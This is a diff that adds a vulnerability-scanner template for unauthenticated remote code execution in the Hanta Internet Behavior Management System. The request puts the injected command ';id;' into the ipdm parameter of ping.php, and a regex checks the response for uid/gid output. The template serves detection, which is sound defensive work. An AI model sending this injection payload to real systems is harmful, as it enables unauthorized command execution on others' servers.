@@ -1,0 +1,32 @@
+id: "hanta-rce"
+name: "Hanta Internet Behavior Management System - Remote Code Execution"
+severity: "high"
+description: "Hanta Internet Behavior Management System is vulnerable to RCE."
+tech:
+  - "php"
+tags:
+  - "hanta"
+  - "rce"
+  - "unauth"
+  - "vuln"
+cwe: "CWE-78"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/dgn/dgn_tools/ping.php?ipdm=2;id;"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "regex"
+    part: "body"
+    regex:
+      - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"
+  - type: "word"
+    part: "header"
+    words:
+      - "text/html"
+  - type: "status"
+    status:
+      - 200
